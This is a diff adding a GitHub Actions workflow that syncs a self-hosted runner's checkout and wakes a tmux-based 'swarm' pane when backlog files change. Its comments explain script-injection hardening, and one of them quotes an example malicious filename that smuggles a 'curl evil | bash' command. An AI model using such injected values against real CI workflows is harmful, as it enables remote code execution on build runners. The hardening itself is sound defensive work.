@@ -1,0 +1,94 @@
+name: Second swarm wake-up bridge
+
+# BL-092: an event-driven replacement for manual/periodic `git pull` on the
+# second (secondary-mode) swarm. Runs ONLY on the self-hosted runner
+# registered from inside that swarm's own WSL2 environment
+# (docs/runbooks/BL-091-wsl2-second-swarm-bringup.md) - no inbound ports,
+# tunnels, or firewall changes needed on either machine, since a self-hosted
+# runner holds an outbound long-poll connection to GitHub.
+#
+# No business logic here: sync the swarm's own persistent checkout, decide
+# (via the pure, unit-tested remote_wakeup_lib.bb) whether this push
+# concerns THIS swarm, and if so wake its specifier pane via its own tmux
+# socket - the same wake mechanism handoffd.bb's own notify! already uses.
+# Routing decisions stay with the roles.
+#
+# Setup (once, on the second swarm's own machine/repo settings):
+#   - Register a self-hosted runner labeled "second-swarm" for this repo.
+#   - Set the repository/environment variable SECOND_SWARM_CHECKOUT_PATH to
+#     that runner's persistent swarm checkout (e.g. ~/code/swarmforgevc,
+#     never /mnt/c - see the WSL2 runbook). Not a secret: a local path.
+#   - If your second swarm's own swarmforge.conf swarm_name isn't the
+#     default "second", update SECOND_SWARM_NAME below to match.
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - 'backlog/active/**'
+      - 'backlog/paused/**'
+
+jobs:
+  wake:
+    runs-on: [self-hosted, second-swarm]
+    env:
+      SECOND_SWARM_NAME: second
+      SWARM_ROOT: ${{ vars.SECOND_SWARM_CHECKOUT_PATH }}
+    steps:
+      - name: Sync the swarm's own persistent checkout (fast-forward only)
+        run: swarmforge/scripts/remote_wakeup_periodic_pull.sh "$SWARM_ROOT"
+
+      - name: Determine which backlog files this push changed
+        id: changed
+        working-directory: ${{ vars.SECOND_SWARM_CHECKOUT_PATH }}
+        # BL-092 hardening: github.event.before/github.sha are read via env:
+        # (real shell variables bash expands) rather than interpolated
+        # directly into the run: script body. `${{ }}` inside a run: script
+        # is a textual substitution GitHub performs BEFORE bash parses the
+        # script - safe here in practice since these two are SHA strings,
+        # but keeping every `${{ }}` out of run: bodies is the documented
+        # GitHub Actions hardening posture and avoids setting a copyable bad
+        # precedent (see the CHANGED_FILES case in the next step, where the
+        # same pattern with attacker-influenceable content would be a real
+        # script-injection vector).
+        env:
+          BEFORE_SHA: ${{ github.event.before }}
+          CURRENT_SHA: ${{ github.sha }}
+        run: |
+          if [[ "$BEFORE_SHA" =~ ^0+$ ]]; then
+            # First push seen on this branch (null before-SHA): there is no
+            # prior commit to diff against, so treat every backlog file
+            # present at this commit as newly relevant.
+            files="$(git -C "$SWARM_ROOT" ls-tree -r --name-only "$CURRENT_SHA" -- backlog/active backlog/paused)"
+          else
+            files="$(git -C "$SWARM_ROOT" diff --name-only "$BEFORE_SHA" "$CURRENT_SHA" -- backlog/active backlog/paused)"
+          fi
+          {
+            echo "files<<EOF"
+            echo "$files"
+            echo "EOF"
+          } >> "$GITHUB_OUTPUT"
+
+      - name: Decide and nudge
+        # BL-092 hardening: steps.changed.outputs.files holds file paths
+        # from the pushed commit's tree - content an attacker with push
+        # access (or a merged PR) partly controls via the filenames they
+        # choose under backlog/active|paused/. Interpolating it directly
+        # into this run: script via `${{ }}` (as the original version did)
+        # is GitHub's documented script-injection anti-pattern: the
+        # substitution happens in the script's SOURCE TEXT before bash
+        # parses it, so a filename containing shell metacharacters (e.g.
+        # `"; curl evil | bash #`) would execute as real shell syntax on
+        # this SELF-HOSTED runner - unlike bash's own unquoted $VAR
+        # expansion, which only word-splits and does not re-parse
+        # metacharacters as syntax. Routing through env: forces bash's safe
+        # expansion instead. `set -f` additionally disables glob expansion
+        # so a filename containing `*`/`?` can't unintentionally match
+        # unrelated files in the working directory; word-splitting (the
+        # behavior remote_wakeup_nudge.bb's variadic <changed-file-path>...
+        # relies on) is unaffected.
+        env:
+          CHANGED_FILES: ${{ steps.changed.outputs.files }}
+        run: |
+          set -f
+          bb swarmforge/scripts/remote_wakeup_nudge.bb "$SWARM_ROOT" "$SECOND_SWARM_NAME" $CHANGED_FILES
